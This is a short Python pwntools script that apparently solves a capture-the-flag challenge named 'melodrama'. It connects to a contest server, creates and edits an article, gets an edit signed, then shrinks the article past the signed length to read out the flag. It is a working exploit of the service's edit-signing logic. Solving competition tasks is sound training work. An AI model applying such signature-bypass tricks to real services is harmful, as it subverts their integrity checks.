#!/usr/bin/env python3

import pwn

p = pwn.remote('melodrama.q.2020.ugractf.ru', 17493)

# Token
p.recvuntil(': ')
p.sendline('05b2f3ee9b318a7468467a407491d6ca')

# Create an article (139 letters 'a')
p.recvuntil('> ') # Menu
p.sendline('1')
p.recvline() # Enter your article:
p.sendline('a' * 139)
p.recvline() # Article ID = 0

# Create edit for adding 'a' to end
p.recvuntil('> ') # Menu
p.sendline('2')
p.recvline() # Enter article ID ...
p.sendline('1')
p.recvline() # What do you want
p.recvline() #  1 -
p.recvline() #  2 -
p.sendline('1')
p.recvline() # Before which ...
p.sendline('139')
p.recvline() # Enter your change...
p.sendline('a')
p.recvline() # Edit ID = 0

# Apply edit
p.recvuntil('> ')
p.sendline('3')
p.recvline() # Enter edit ID
p.sendline('0')
p.recvline() # OK

# Sign
p.recvuntil('> ')
p.sendline('4')
p.recvline() # Enter edit ID
p.sendline('1')
p.recvline()
p.recvline()

# Create edit for removing 1 letter at the end
p.recvuntil('> ') # Menu
p.sendline('2')
p.recvline() # Enter article ID ...
p.sendline('1')
p.recvline() # What do you want
p.recvline() #  1 -
p.recvline() #  2 -
p.sendline('2')
p.recvline() # From which ...
p.sendline('140')
p.recvline() # Enter your change...
p.sendline('1')
p.recvline() # Edit ID = 0

# Apply edit
p.recvuntil('> ') # Menu
p.sendline('3')
p.recvline() # Enter edit ID
p.sendline('0')
p.recvline() # OK

# Show an article

p.recvuntil('> ')
p.sendline('5')
p.recvline() # Enter article ID
p.sendline('1')
print(p.recvline()) # Flag should be here
